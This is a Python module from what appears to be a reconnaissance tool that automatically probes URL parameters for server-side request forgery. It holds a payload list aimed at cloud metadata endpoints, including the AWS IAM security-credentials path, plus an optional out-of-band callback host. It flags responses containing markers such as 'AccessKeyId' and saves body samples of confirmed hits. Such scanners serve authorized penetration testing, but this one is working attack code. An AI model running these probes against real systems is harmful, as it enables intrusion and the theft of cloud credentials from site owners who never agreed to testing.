"""SSRF auto-probe helpers — shared by param_discovery."""

from __future__ import annotations

import json
import logging
from pathlib import Path

from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

from recon.context import ReconContext
from recon.utils import http_get, read_lines

LOG = logging.getLogger("recon.ssrf_probe")

SSRF_PARAM_NAMES = frozenset(
    {"url", "uri", "path", "redirect", "src", "dest", "target", "callback", "link", "file", "page", "load"}
)

SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://127.0.0.1/",
    "http://localhost/admin",
]

HIT_MARKERS = (
    "ami-id",
    "instance-id",
    "hostname",
    "local-ipv4",
    "computeMetadata",
    "security-credentials",
    "AccessKeyId",
)


def _oob_payload(ctx: ReconContext) -> str | None:
    collab = ctx.config.burp_collab.strip()
    if not collab:
        return None
    if collab.startswith("http"):
        return collab
    return f"http://{collab}"


def _build_probe_url(url: str, param: str, payload: str) -> str:
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    mutated = {k: v[:] for k, v in params.items()}
    mutated[param] = [payload]
    flat = [(k, v) for k, vals in mutated.items() for v in vals]
    return urlunparse(parsed._replace(query=urlencode(flat, doseq=True)))


def _is_hit(status: int, body: str, payload: str, oob: bool = False) -> bool:
    if oob:
        return False  # blind — confirmed async via interactsh callback (logged separately)
    if status == 0:
        return False
    lower = body.lower()
    return any(m.lower() in lower for m in HIT_MARKERS)


def run_ssrf_probes(ctx: ReconContext, ssrf_file: Path | str, out_path: Path | str) -> int:
    """Probe SSRF-classified URLs; write confirmed hits to out_path."""
    out_path = Path(out_path)
    ssrf_file = Path(ssrf_file)
    if not ssrf_file.exists():
        return 0

    payloads = list(SSRF_PAYLOADS)
    oob = _oob_payload(ctx)
    if oob:
        payloads.append(oob)

    records: list[dict] = []
    for url in read_lines(ssrf_file)[:50]:
        parsed = urlparse(url)
        if not parsed.query:
            continue
        params = parse_qs(parsed.query, keep_blank_values=True)
        for pname in params:
            if pname.lower() not in SSRF_PARAM_NAMES:
                continue
            for payload in payloads:
                probe_url = _build_probe_url(url, pname, payload)
                ctx.rate_limiter.wait()
                status, body, _headers = http_get(probe_url, rate_limiter=None)
                is_oob = oob is not None and payload == oob
                confirmed = _is_hit(status, body, payload, oob=is_oob)
                if confirmed or status in (200, 301, 302, 307, 308):
                    records.append(
                        {
                            "original_url": url,
                            "probe_url": probe_url,
                            "param": pname,
                            "payload": payload,
                            "status": status,
                            "confirmed": confirmed,
                            "blind_oob": is_oob,
                            "body_sample": body[:500] if confirmed else "",
                        }
                    )
                if confirmed:
                    LOG.warning("SSRF confirmed: %s param=%s payload=%s", url, pname, payload)
                    break
            break

    out_path.write_text(
        "\n".join(json.dumps(r) for r in records) + ("\n" if records else ""),
        encoding="utf-8",
    )
    return len([r for r in records if r.get("confirmed")])
